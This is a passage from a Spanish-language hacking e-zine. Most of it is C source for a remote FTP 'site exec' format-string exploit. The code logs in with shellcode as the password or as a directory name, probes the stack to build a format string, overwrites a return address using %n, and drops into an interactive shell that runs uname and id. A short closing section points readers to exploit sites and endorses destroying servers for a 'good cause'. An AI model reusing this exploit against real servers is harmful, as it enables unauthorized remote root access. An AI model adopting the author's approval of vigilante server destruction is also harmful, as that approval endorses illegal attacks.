    }
  if((sock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
    {
      fprintf(stderr,"Error creating socket: %s\n",strerror(errno));
      exit(1);
    }
  cl.sin_family=PF_INET;
  cl.sin_port=htons(21);
  if(connect(sock,(struct sockaddr*)&cl,sizeof(cl))==-1)
    {
      fprintf(stderr,"Cannot connect to %s: %s\n",host,strerror(errno));
      exit(1);
    }
  return sock;
}

int ftp_recv(int sock,char*buf,int buf_size,int disc)
{
  int n=0;
  char q;

  if(disc) while((n=recv(sock,&q,1,0))==1&&q!='\n');
  else
    {
      (void)bzero(buf,buf_size);
      n=recv(sock,buf,buf_size,0);
      if(n<0)
        {
          fprintf(stderr,"ftp_recv: recv failed\n");
          exit(1);
        }
      buf[n]=0;
    }
  return n;
}
int ftp_send(int sock,char*what,int size,int f,char*ans,int ans_size)
{
  int n;
  n=send(sock,what,size,0);
  if(n!=size)
    {
      fprintf(stderr,"ftp_send: failed to send. expected %d, sent %d\n", size,n);
      shutdown(sock,2);
      close(sock);
      exit(1);
    }
  if(f)
    return ftp_recv(sock,ans,ans_size,0);
  return 0;
}

int ftp_siteexec(int sock,char*buff,int buff_len,int q,char*ans,int ans_len)
{
  ftp_send(sock,buff,buff_len,q,ans,ans_len);
  if(strncmp(ans,"200-",4)==0)
    ftp_recv(sock,NULL,0,1);
  else
    ftp_recv(sock,ans,ans_len,0);

  if(strncmp(ans,"200-",4))
    {
      fprintf(stderr,"Cannot find site exec response string\n");
      exit(1);
    }
  return 0;
}

void ftp_login(int sock,char*u_name,char*u_pass)
{
  char buff[2048];
  printf("loggin into system..\n");
  snprintf(buff,2047,"USER %s\r\n", u_name);
  ftp_send(sock, buff,strlen(buff),1,buff,2047);
  printf(GREEN"USER %s\n"NORM"%s",u_name,buff);
  snprintf(buff,2047,"PASS %s\r\n",u_pass);
  printf(GREEN"PASS %s\n"NORM,*u_pass=='\x90'?"&lt;shellcode>":u_pass);
  ftp_send(sock,buff,strlen(buff),1,buff,2047);
  while(strstr(buff,"230 ")==NULL)
    {
      (void)bzero(buff,2048);
      ftp_recv(sock,buff,2048,0);
    }
  printf("%s",buff);
  return;
}

void ftp_mkchdir(int sock,char*cd,char*new)
{
  char buff[2048];

  sprintf(buff,"CWD %s\r\n",cd);
  printf(GREEN"%s"NORM,buff);
  ftp_send(sock,buff,strlen(buff),1,buff,2047);
  printf("%s",buff);
  sprintf(buff,"MKD %s\r\n",new);
  ftp_send(sock,buff,strlen(buff),1,buff,2047);
  printf(GREEN"MKD &lt;shellcode>"NORM"\n%s",buff);
  sprintf(buff,"CWD %s\r\n",new);
  ftp_send(sock,buff,strlen(buff),1,buff,2047);
  printf(GREEN"CWD &lt;shellcode>"NORM"\n%s",buff);
  return;
}
void process_possibly_rooted(int sock)
{
  fd_set 	fd_read;
  char buff[1024], *cmd=getit.islinux?"/bin/uname -a;/usr/bin/id;\n":"/usr/bin/uname -a;/usr/bin/id;\n";
  int n;

  FD_ZERO(&fd_read);
  FD_SET(sock, &fd_read);
  FD_SET(0, &fd_read);
  send(sock, cmd, strlen(cmd), 0);
  while(1)
    {
      FD_SET(sock,&fd_read);
      FD_SET(0,&fd_read);
      if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
      if( FD_ISSET(sock, &fd_read) )
        {
          if((n=recv(sock,buff,sizeof(buff),0))<0)
            {
              fprintf(stderr, "EOF\n");
              exit(2);
            }
          if(write(1,buff,n)<0)break;
        }
      if ( FD_ISSET(0, &fd_read) )
        {
          if((n=read(0,buff,sizeof(buff)))<0)
            {
              fprintf(stderr,"EOF\n");
              exit(2);
            }
          if(send(sock,buff,n,0)<0) break;
        }
      usleep(10);
    }
  fprintf(stderr,"Connection aborted, select failed()\n");
  exit(0);
}

int magic_check_f(int sock, char *str)
{
  char q[2048], ans[2048];

  snprintf(q, 2048, "site exec %s%s\r\n", str, "%.f");
  if( strstr( q, "\r\n") == NULL)
    {
      fprintf(stderr,"Line TOO big..\n");
      exit(-1);
    }
  ftp_siteexec(sock, q, strlen(q), 1, ans, 2048);
  if( before_len+10 < strlen(&ans[3]) ) return 0;
  before_len=strlen(&ans[3]);
  (void)strcat(str,"%.f");
  return 1;
}
int magic_check_o(int sock, char *str)
{
  char q[2048], ans[2048];
  snprintf(q, 2048, "site exec %s%s\r\n", str, "%c");
  if( strstr( q, "\r\n") == NULL)
    {
      fprintf(stderr,"Line TOO big..\n");
      exit(-1);
    }
  ftp_siteexec( sock, q, strlen(q), 1, ans, 2048);
  if( before_len== strlen(&ans[3]) )
    {
      before_len+=1;
      (void)strcat(str, "%d");
      return 3;
    }
  before_len=strlen(&ans[3]);
  (void)strcat(str,"%c");
  return 2;
}

int magic_check_ok( int sock, char *str)
{
  char q[2048], ans[2048];
  int i ,n=1, f, padding=0;

  snprintf(q, 2048,"site exec aaaaaaaa%s%s\r\n", str, "%p%p");
  if ( strstr(q, "\r\n" ) == NULL)
    {
      fprintf(stderr, "Line too long\n");
      exit(-1);
    }
  (void)bzero(ans, 2048);
  ftp_siteexec(sock, q, strlen(q), 1, ans, 2047);
  if(strstr(ans,"0x61616161")==NULL)
    return 0;
  for(i =0; i < MAX_MAGIC && magic[i]; i++);
  magic_d[i]=4;
  while(n)
    {
      for(f=0; f< 2; f++)
        {
          snprintf(q, 2048,"site exec %.*saaaa%s%s\r\n", padding, "xxxx", str, f?"%p%p":"%p");
          (void)bzero(ans, 2048);
          ftp_siteexec(sock, q, strlen(q), 1, ans, 2047);
          if( strstr(ans, "0x61616161")!=NULL)
            {
              if (f==0)
                {
                  magic[i]=padding;
                  return 1;
                }
              else if( f==1)
                {
                  strcat(str,"%p");
                  magic[i]=padding;
                  return 1;
                }
            }
        }
      if(padding > 4)
        {
          fprintf(stderr,"Cannot calculate padding..\n");
          exit(1);
        }
      padding++;
    }
  return 1;
}


int magic_digger(int sock)
{
  int get_out=1,where=0,all_failed=MAX_FAILED*2,f=0,o=0;

  if(magic_str==NULL)
    {
      if((magic_str=(char*)malloc(4092))==NULL)
        {
          perror("malloc");
          exit(errno);
        }
    }
  (void)bzero(magic_str, 4092);
  where=0;
  while(get_out)
    {
      int q;
      if( where >= MAX_MAGIC-1 || all_failed <= 0 )
        return -1;
      if( magic_check_f(sock, magic_str) )
        {
          o=0,f++;
          if(f==1)
            {
              if(!magic[where])
                magic[where]=1;
              else
                magic[++where]+=1;
              magic_d[where]=1;
            }
          else
            magic[where]+=1;
          all_failed=MAX_FAILED*2;
          printf("%s", "%.f");
          fflush(stdout);
          goto verify;
        }
      all_failed--;
      if((q=magic_check_o(sock,magic_str)))
        {
          f=0,o++;
          if(o==1)
            {
              if(!magic[where])
                magic[0]=1;
              else
                magic[++where]+=1;
              magic_d[where]=q;
            }
          else
            {
              if(magic_d[where]==q)
                magic[where]+=1;
              else
                {
                  magic[++where]=1;
                  magic_d[where]=q;
                }
            }
          all_failed=MAX_FAILED*2;
          printf("%s", q==2?"%c":"%d");
          fflush(stdout);
          goto verify;
        }
      all_failed--;
      continue;
verify:
      if(magic_check_ok(sock,magic_str))
        {
          putchar('\n');
          return 0;
        }
    }
  return 0;
}

int main(int argc, char *argv[])
{
  char *buff, *buff_p, *buff_p2, c, shellcode[500],*dir,*passwd=shellcode;
  int i, sock, num=-2, padding=-1, gm=0, testmode=0,mtype=0,bla=0,offset=0;
  u_long ret_addr=0, pass_addr=0;
  for(i=0;targ[i].os_descr!=NULL;i++);
  while((c=getopt(argc,argv,"t:l:m:o:s:r:p:M:P:xghH?"))!=EOF)
    {
      switch(c)
        {
        case 't':
          target=optarg;
          break;
        case 'l':
          username=optarg;
          passwd=strchr(optarg,'/');
          if(passwd==NULL)
            usage(argv[0],0);
          *passwd++=(char)0;
          break;
        case 'x':
          testmode=1;
          break;
        case 'o':
          offset=atoi(optarg);
          break;
        case 'p':
          pass_addr=strtoul(optarg, &optarg,16);
          break;
        case 'g':
          gm=1;
          break;
        case 'M':
          dir=optarg;
          mtype=1;
          break;
        case 'm':
          {
            int where=0;
            if(!*optarg)
              {
                fprintf(stderr,"-m requires argument, try -h for help\n");
                exit(1);
              }
            while(1)
              {
                magic[where]=strtoul(optarg,&optarg,16);
                optarg=strchr(optarg,',');
                if(optarg==NULL)
                  {
                    printf("comma missing\n");
                    exit(1);
                  }
                optarg++;
                magic_d[where++]=strtoul(optarg,&optarg,16);
                if(strchr(optarg,':')==NULL)
                  {
                    magic[where]=magic_d[where]=0;
                    break;
                  }
                optarg=strchr(optarg,':');
                optarg++;
              }
          }
          break;
        case 's':
          num=atoi(optarg);
          if(num>i)
            {
              fprintf(stderr,"systype too big, try -h for help\n");
              exit(1);
            }
          break;
        case 'r':
          ret_addr=strtoul(optarg,&optarg,16);
          break;
        case 'P':
          padding=atoi(optarg);
          break;
        case 'H':
          bla=2;
        default:
          usage(argv[0],bla);
          break;
        }
    }
  if(target==NULL)
    {
      fprintf(stderr,"No target specified, try -h for help\n");
      exit(1);
    }
  if(num==-1||num==-2)
    {
      for(i=0;!targ[i].def;i++);
      num=i;
    }
  (void)memcpy((void*)&getit,(void*)&targ[num],sizeof(struct targets));

  if(magic[1]!=0)
    {
      memcpy((void*)getit.magic,magic,sizeof(magic));
      memcpy((void*)getit.magic_d,magic_d,sizeof(magic));
    }

  if(ret_addr)getit.addr_ret_addr=ret_addr;
  if(pass_addr)getit.pass_addr=pass_addr;

  getit.addr_ret_addr+=(offset*4);

  sock=connect_to_server(target);
  memset(shellcode, '\x90', sizeof(shellcode));
  shellcode[sizeof(shellcode)-1]=(char)0;
  if(!mtype)
    {
      memcpy((void*)&shellcode[sizeof(shellcode)-strlen(getit.shellcode)-1],(void*)getit.shellcode, strlen(getit.shellcode)+1);
      shellcode[sizeof(shellcode)-1]=(char)0;
    }
  else
    {
      memcpy((void*)&shellcode[250-strlen(getit.shellcode)-1],(void*)getit.shellcode,strlen(getit.shellcode));
      shellcode[250-1]=(char)0;
    }
  printf("Target: %s (%s/%s): %s\n",target,username,*passwd=='\x90'?"&lt;shellcode>":passwd,getit.os_descr);
  printf("Return Address: 0x%08lx, AddrRetAddr: 0x%08lx, Shellcode: %d\n\n",getit.pass_addr,getit.addr_ret_addr,strlen(getit.shellcode));

  buff=(char *)malloc(1024);
  bzero(buff,1024);

  (void)ftp_recv(sock,NULL,0,1);

  (void)ftp_login(sock,username,passwd);

  if(gm||(magic_str==NULL&&getit.magic[0]==0))
    {
      printf("STEP 2A: Generating magic string: ");
      fflush(stdout);
      magic_digger(sock);
      memcpy((void *)getit.magic,(void*)magic,sizeof(magic));
      memcpy((void*)getit.magic_d,(void*)magic_d,sizeof(magic_d));
      printf("STEP 2B: MAGIC STRING: [");
    }
  else
    {
      printf("STEP 2 : Skipping, magic number already exists: [");
    }
  for(i=0;i&lt;MAX_MAGIC&&getit.magic[i]!=0;i++)
    {
      printf("%02X,%02X",getit.magic[i],getit.magic_d[i]);
      if(getit.magic[i+1]!=0)
        putchar(':');
    }
  printf("]\n");
  buff=(char *)realloc(buff, 4092);
  (void)bzero(buff, 4092);
  if(mtype)
    ftp_mkchdir(sock,dir,shellcode);
  printf("STEP 3 : Checking if we can reach our return address by format string\n");
  if(!magic_str)
    {
      magic_str=(char*)malloc(2048);
      if(magic_str==NULL)
        {
          perror("malloc");
          exit(errno);
        }
      (void)bzero(magic_str,2048);
      for(i=0;i&lt;MAX_MAGIC&&getit.magic[i]!=0;i++)
        {
          switch(getit.magic_d[i])
            {
            case 1:
              for(num=0;num&lt;getit.magic[i];num++)strcat(magic_str,"%.f");
              break;
            case 2:
              for(num=0;num&lt;getit.magic[i];num++)strcat(magic_str,"%c");
              break;
            case 3:
              for(num=0;num&lt;getit.magic[i];num++)strcat(magic_str,"%d");
              break;
            case 4:
              if(padding<0)padding=getit.magic[i];
              break;
            default:
              fprintf(stderr,"STEP 3: INternal error\n");
              exit(1);
              break;
            }
        }
    }
  if(padding<0)
    {
      for(num=0;num&lt;MAX_MAGIC&&getit.magic_d[num]!=4;num++);
      if(num<(MAX_MAGIC-1))
        padding=getit.magic[num];
      else
        fprintf(stderr,"WARNING: PROBLEMS WITH PADDING\n");
    }

  if(!getit.islinux)
    {
      if(!testmode)
        snprintf(buff,4096,"site exec %.*s%c%c%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.addr_ret_addr),magic_str,"%p");
      else
        snprintf(buff,4096,"site exec %.*s%c%c%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.pass_addr),magic_str,"%p");
    }
  else
    {
      if(!testmode)
        snprintf(buff,4096,"site exec %.*s%c%c\xff%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.addr_ret_addr),magic_str,"%p");
      else
        snprintf(buff,4096,"site exec %.*s%c%c\xff%c%c%s|%s\r\n",padding,"xxxxxxxxxxxxxxxxxxx",MAKE_STR_FROM_RET(getit.pass_addr),magic_str,"%p");
    }
  sleep(getit.delay);
  fflush(stdout);
  if((buff_p=(char *)malloc(4096))==NULL)
    {
      fprintf(stderr,"malloc failed.\n");
      exit(1);
    }
  (void)bzero(buff_p,4096);
  ftp_siteexec(sock,buff,strlen(buff),1,buff_p,4095);
  if((buff_p2=strchr(buff_p,'\r'))!=NULL)
    *buff_p2=(char)0;
  if((buff_p2=strchr(buff_p,'\n'))!=NULL)
    *buff_p2=(char)0;
  buff_p2=strstr(buff_p,"|0x");
  if(buff_p2==NULL)
    {
      fprintf(stderr,"Fix me, incorrect response from '%%p':%s\n",buff_p);
      exit(1);
    }
  buff_p2+=3;
  if(!testmode)
    printf("STEP 4 : Ptr address test: 0x%s (if it is not 0x%08lx ^C me now)\n",buff_p2,getit.addr_ret_addr);
  else
    printf("STEP 4 : Ptr address test: 0x%s (if it is not 0x%08lx ^C me now)\n",buff_p2,getit.pass_addr);
  sleep(getit.delay);
  buff_p2=strstr(buff, "%.f");
  *buff_p2++=(char )0;
  strcpy(buff_p, buff);
  if(!testmode)
    sprintf(buff_p+strlen(buff_p),"%s%u%c","%d%.",(u_int)getit.pass_addr,'d');
  else
    sprintf(buff_p+strlen(buff_p),"%s","%d%d");
  strcpy(buff_p+strlen(buff_p), buff_p2);
  buff_p2=strchr(buff_p,'|');
  buff_p2++;
  printf("STEP 5 : Sending code.. this will take about 10 seconds.\n");
  if(!testmode)
    {
      strcpy(buff_p2,"%n\r\n");
      ftp_send(sock,buff_p,strlen(buff_p),0,NULL,0);
    }
  else
    {
      (void)bzero(buff,4096);
      strcpy(buff_p2,"%s\r\n");
      ftp_send(sock,buff_p,strlen(buff_p),1,buff,4092);
      printf("got answer: %s\n",buff);
      exit(0);
    }
  free(buff_p);
  free(buff);
  signal(SIGINT, SIG_IGN);
  signal(SIGHUP, SIG_IGN);
  printf(RED"Press ^\\ to leave shell"NORM"\n");
  process_possibly_rooted(sock);
  return 0;
}




.==========================================================================.
|=======~ 4.2 EXPLOITS ~====================================================
|===========================================================================


Espero que os sirvan  de algo estos exploits, y que podeis  encontrar muchos
de ellos, en mont≤n de paginas como podrφa ser en el buscador por excelencia
hacker:

http://astalavista.box.sk

o tambien en

http://www.cyberarmy.com o buscais

en algun buscador como www.google.com o yo que se en ..etc. etc XDDd, X;)

No hackeeis por hackear o por simple diversi≤n, que si lo hackeeis, sea  por
una buena causa  como podrφa  ser  destrozar algun servidor  de  pornografφa
infantil, ....etc,..etc. y no destroceis el ordenata de vuestro maestro o el
servidor de tu insti, ya que sino se  pueden cabrear y  poneros las cosas un
poco mßs fea, esto son  solo algunos  comentarios, que  cada uno actue  como
quiera y  mire el articulo desde  el punto que  mßs  le guste,  me  gustarφa
agradecerle el apoyo  a varios  colegas mios que sin  su apoyo  no creo  que
hubiese  escrito ningun articulo para  la e-zine que  son w3ndig0 y  DDiego,
espero que haya sido de vuestro agrado, y  un saludo de vuestro colega
mitr3in.

				bY mitrein
			mitreindisidnt@yahoo.es


```

</div>
